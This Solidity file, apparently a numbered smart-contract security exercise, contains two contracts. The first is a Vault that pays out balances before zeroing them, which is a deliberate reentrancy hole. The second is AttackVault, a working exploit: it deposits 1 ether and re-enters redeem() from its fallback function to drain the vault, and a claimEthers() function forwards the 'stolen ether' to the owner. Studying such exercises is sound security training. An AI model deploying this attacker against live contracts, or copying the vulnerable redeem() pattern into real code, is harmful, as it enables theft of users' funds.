//*** Exercice 9 ***//
// You can store ETH in this contract and redeem them.
pragma solidity ^0.4.10;
contract Vault {
    mapping(address => uint) public balances;

    /// @dev Store ETH in the contract.
    function store() payable {
        balances[msg.sender]+=msg.value;
    }

    /// @dev Redeem your ETH.
    function redeem() {
        msg.sender.call.value(balances[msg.sender])();
        balances[msg.sender]=0;
    }
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract AttackVault {
    Vault public vault;
    address owner;

    function AttackVault (address _address) {
    vault = Vault(_address);
    owner = msg.sender;
    }

    modifier onlyOwner {
      require(msg.sender == owner);
      _;
    }

    //IMPORTANT this function needs 1 ETH for attack.
    function hack() public payable{
    vault.store.value(1 ether)();
    vault.redeem();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    //This function transfers stolen ether to the owner.
    function claimEthers() public payable onlyOwner{
        msg.sender.transfer(address(this).balance);
    }

    function() external payable{
        if(address(vault).balance >= 1 ether){
            vault.redeem();
        }
    }
}
